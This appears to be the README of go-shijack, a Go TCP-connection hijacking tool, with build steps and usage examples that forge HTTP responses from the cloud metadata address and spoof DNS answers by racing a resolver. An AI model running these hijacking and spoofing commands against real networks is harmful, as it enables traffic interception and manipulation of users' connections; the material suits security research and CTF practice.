# go-shijack

tcp connection hijacker, go rewrite of shijack from 2001.

## build

```
make go-shijack
```

```
make container
```

```
CGO_ENABLED=0 go install github.com/ssst0n3/go-shijack/cmd/go-shijack@v0.1.0
```

## usage

### 1. write response file

```
root@ecs-c5a4:~# cat > flag << EOF

HTTP/1.1 200 OK
Content-Length: 11

flag{test}
EOF
```

### 2. hijack

#### 2.1 method1: binary

```
root@ecs-c5a4:~# ./go-shijack -t eth0 -i 169.254.169.254 -p 80 -f flag &
[1] 362712
root@ecs-c5a4:~# curl http://169.254.169.254
flag{test}
```

#### 2.2 method2: container

```
root@ecs-c5a4:~# docker run -d --net=host -ti --rm -v $(pwd):/data ssst0n3/go-shijack:v0.1 -t eth0 -i 169.254.169.254 -p 80 -f /data/flag -k
root@ecs-c5a4:~# curl http://169.254.169.254
flag{test}
```

### 3. hijack dns

DNS hijack sniffs UDP queries to a resolver and races it with a forged response.
`-i`/`-p` are the resolver's IP and port (usually 53). Two ways to supply the
answer:

#### 3.1 auto-construct (A record)

```
root@ecs-c5a4:~# ./go-shijack -t eth0 -i 8.8.8.8 -p 53 --protocol dns --dns-domain example.com --dns-ip 1.2.3.4 -k &
root@ecs-c5a4:~# dig @8.8.8.8 example.com +short
1.2.3.4
```

#### 3.2 raw response file (any record type)

Prepare a captured DNS response (its transaction ID will be rewritten per query):

```
root@ecs-c5a4:~# dig @8.8.8.8 example.com > /dev/null  # warm cache as needed
root@ecs-c5a4:~# tcpdump -i eth0 -c 1 -w resp.bin 'src 8.8.8.8 and udp and port 53'
root@ecs-c5a4:~# ./go-shijack -t eth0 -i 8.8.8.8 -p 53 --protocol dns -f resp.bin -k &
```

## bpf

### method 1

Use predefined pattern, just provide host and port to go-shijack

### TODO: method 2 

Compile filter manually

`tcpdump ip -d -s 65536 host 169.254.169.254`

## related project

* [rshijack](https://github.com/kpcyrd/rshijack)
* [shijack](https://packetstormsecurity.com/files/24657/shijack.tgz.html)
